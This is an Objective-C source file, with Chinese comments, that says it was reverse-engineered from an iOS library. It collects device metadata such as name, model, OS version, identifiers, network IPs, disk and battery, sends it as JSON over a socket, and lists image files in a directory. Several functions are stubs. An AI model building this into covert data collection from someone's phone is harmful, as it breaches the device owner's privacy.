// MetadataServer.m - 设备元数据采集实现
// 逆向自 libappcore.dylib (IOSDeviceInfo + MetadataServer)
#import "acquisition/MetadataServer.h"
#import <UIKit/UIKit.h>
#import <sys/sysctl.h>
#import <sys/utsname.h>
#import <sys/socket.h>
#import <ifaddrs.h>
#import <net/if.h>
#import <netinet/in.h>
#import <arpa/inet.h>

@implementation IOSDeviceInfo

+ (NSString*)GetDeviceName {
    return [[UIDevice currentDevice] name];
}

+ (NSString*)GetDeviceType {
    struct utsname systemInfo;
    uname(&systemInfo);
    return [NSString stringWithUTF8String:systemInfo.machine];
}

+ (NSString*)GetIOSVersion {
    return [[UIDevice currentDevice] systemVersion];
}

+ (NSString*)GetSerialNumber {
    // 通过 IOKit 获取序列号 (需要特殊权限)
    // 简化: 返回设备 identifierForVendor
    return [[[UIDevice currentDevice] identifierForVendor] UUIDString];
}

+ (NSString*)GetUDID {
    // 真实 UDID 需要特殊 entitlements
    // 简化: 返回 identifierForVendor
    return [[[UIDevice currentDevice] identifierForVendor] UUIDString];
}

+ (BOOL)IsLockscreenOn {
    // 通过通知中心判断锁屏状态
    // 简化: 返回 NO
    return NO;
}

+ (NSString*)AAFrameworkGetKey:(NSString*)key {
    // AAFramework 是 AppleAccount 框架
    // 用于获取 Apple ID 相关信息
    // 需要特殊权限, 简化返回 nil
    return nil;
}

+ (BOOL)IsSupported {
    // 检查是否支持采集 (iOS 版本, 设备架构)
    NSString* version = [self GetIOSVersion];
    int major = [[version componentsSeparatedByString:@"."][0] intValue];
    return major >= 12 && major <= 16;
}

@end

@implementation MetadataServer

- (void)OnNewSession:(int)client_fd {
    NSLog(@"MetadataServer: new session on fd %d", client_fd);

    // 采集元数据并发送
    NSDictionary* metadata = [self CollectMetadata];

    NSError* error = nil;
    NSData* jsonData = [NSJSONSerialization dataWithJSONObject:metadata
                                                       options:NSJSONWritingPrettyPrinted
                                                         error:&error];
    if (jsonData) {
        send(client_fd, jsonData.bytes, jsonData.length, 0);
        NSLog(@"Metadata sent: %lu bytes", (unsigned long)jsonData.length);
    }
}

- (NSDictionary*)CollectMetadata {
    NSMutableDictionary* metadata = [NSMutableDictionary dictionary];

    // 基本设备信息
    metadata[@"device_name"] = [IOSDeviceInfo GetDeviceName];
    metadata[@"device_type"] = [IOSDeviceInfo GetDeviceType];
    metadata[@"ios_version"] = [IOSDeviceInfo GetIOSVersion];
    metadata[@"serial_number"] = [IOSDeviceInfo GetSerialNumber];
    metadata[@"udid"] = [IOSDeviceInfo GetUDID];
    metadata[@"model"] = [[UIDevice currentDevice] model];
    metadata[@"localized_model"] = [[UIDevice currentDevice] localizedModel];
    metadata[@"system_name"] = [[UIDevice currentDevice] systemName];

    // 屏幕信息
    UIScreen* screen = [UIScreen mainScreen];
    metadata[@"screen_width"] = @(screen.bounds.size.width * screen.scale);
    metadata[@"screen_height"] = @(screen.bounds.size.height * screen.scale);
    metadata[@"screen_scale"] = @(screen.scale);

    // 时间信息
    NSDateFormatter* formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss Z"];
    metadata[@"collection_time"] = [formatter stringFromDate:[NSDate date]];
    metadata[@"timezone"] = [[NSTimeZone localTimeZone] name];

    // 语言/区域
    metadata[@"language"] = [[NSLocale preferredLanguages] firstObject];
    metadata[@"locale"] = [[NSLocale currentLocale] localeIdentifier];

    // 磁盘空间
    NSDictionary* attrs = [[NSFileManager defaultManager]
        attributesOfFileSystemForPath:NSHomeDirectory() error:nil];
    if (attrs) {
        metadata[@"disk_total"] = @([attrs[NSFileSystemSize] unsignedLongLongValue]);
        metadata[@"disk_free"] = @([attrs[NSFileSystemFreeSize] unsignedLongLongValue]);
    }

    // 网络信息 (IP 地址)
    NSMutableDictionary* network = [NSMutableDictionary dictionary];
    struct ifaddrs* interfaces = NULL;
    if (getifaddrs(&interfaces) == 0) {
        struct ifaddrs* ifa = interfaces;
        while (ifa) {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in* sin = (struct sockaddr_in*)ifa->ifa_addr;
                NSString* ip = [NSString stringWithUTF8String:inet_ntoa(sin->sin_addr)];
                network[@(ifa->ifa_name)] = ip;
            }
            ifa = ifa->ifa_next;
        }
        freeifaddrs(interfaces);
    }
    metadata[@"network"] = network;

    // 已安装应用 (需要容器访问权限)
    metadata[@"installed_apps_note"] = @"Requires MCM container access";

    // 电池状态
    [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES];
    metadata[@"battery_level"] = @([[UIDevice currentDevice] batteryLevel]);
    metadata[@"battery_state"] = @([[UIDevice currentDevice] batteryState]);

    return metadata;
}

@end

@implementation ThumbCollector

- (void)startCollection {
    NSLog(@"ThumbCollector: starting collection");
}

- (NSArray*)collectThumbnails:(NSString*)directory {
    // 收集指定目录下的图片缩略图
    NSFileManager* fm = [NSFileManager defaultManager];
    NSMutableArray* thumbs = [NSMutableArray array];

    NSArray* files = [fm contentsOfDirectoryAtPath:directory error:nil];
    for (NSString* file in files) {
        NSString* ext = [[file pathExtension] lowercaseString];
        if ([ext isEqualToString:@"jpg"] || [ext isEqualToString:@"jpeg"] ||
            [ext isEqualToString:@"png"] || [ext isEqualToString:@"heic"]) {
            [thumbs addObject:[directory stringByAppendingPathComponent:file]];
        }
    }
    return thumbs;
}

@end
